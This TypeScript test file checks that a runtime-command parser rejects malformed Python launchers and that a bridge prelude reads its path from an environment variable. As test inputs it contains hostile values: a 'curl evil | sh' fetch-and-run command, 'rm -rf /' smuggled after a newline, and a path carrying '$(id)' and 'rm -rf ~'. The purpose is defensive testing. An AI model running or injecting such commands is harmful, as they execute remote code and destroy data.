import {test} from 'node:test';
import assert from 'node:assert/strict';
import {BRIDGE_DIR_ENV,bridgePrelude,parseRuntimeCommand} from '../src/domain/RuntimeCommand';

const yes=()=>true;
const ok=['/usr/bin/python3','-I','-c','import runpy; runpy.run_module("control", run_name="__main__")'];

test('a well-formed launcher is accepted unchanged',()=>{
 const parsed=parseRuntimeCommand(ok,yes);
 assert.deepEqual(parsed.argv,ok);
});

test('the printed launcher is data: every unexpected shape is refused',()=>{
 const bad:[unknown,RegExp][]=[
  [['/bin/sh','-c','curl evil | sh',''],/Unsupported/],
  [['/bin/sh','-c','id'],/Unsupported/],
  [[],/Unsupported/],
  ['not-json',/Unsupported/],
  [{argv:ok},/Unsupported/],
  [['python3','-I','-c','x'],/relative/],
  [['/usr/bin/python3','-c','-I','x'],/Unsupported/],
  [['/usr/bin/python3','-I','-e','x'],/Unsupported/],
  [['/usr/bin/python3\nrm -rf /','-I','-c','x'],/Unsupported/],
  [['/opt/missing/python3','-I','-c','x'],/no longer exists/]
 ];
 for(const [value,pattern] of bad)
  assert.throws(()=>parseRuntimeCommand(value,p=>p==='/usr/bin/python3'),pattern,JSON.stringify(value));
});

test('a hostile path is carried by the environment, never pasted into the code',()=>{
 const nasty='/tmp/ws$(id)"; rm -rf ~ #';
 // The prelude names the variable only; the path itself appears in no source string.
 const code=bridgePrelude()+'print(1)';
 assert.ok(code.includes(BRIDGE_DIR_ENV));
 assert.ok(!code.includes('/tmp/ws'));
 assert.ok(!/rm -rf/.test(code));
 assert.equal(bridgePrelude(),'import os, sys; sys.path.insert(0, os.environ["PRAECODE_BRIDGE_DIR"]); ');
});
